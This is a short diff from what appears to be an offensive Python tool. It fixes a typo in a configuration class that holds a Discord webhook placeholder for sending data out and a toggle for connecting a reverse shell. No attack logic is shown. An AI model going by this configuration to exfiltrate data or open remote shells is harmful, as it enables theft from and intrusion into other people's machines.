@@ -25,7 +25,7 @@ from cryptography.hazmat.primitives.ciphers import (Cipher, algorithms, modes)
 class VARIABLES:
     webhook    = "YOUR-WEBHOOK" # your discord webhook
     printOnEnd = False # True = don't print endText when program finished - False = don't print
-    endText    = "PROGRAM FINISEHD" # change this to whatever you want to print when the program finishes
+    endText    = "PROGRAM FINISHED" # change this to whatever you want to print when the program finishes
 
     """ If you don't have any clue what you're doing - keep REVSHELL False """
     REVSHELL  = False # False = dont connect to your shell - True = try to connect to your shell
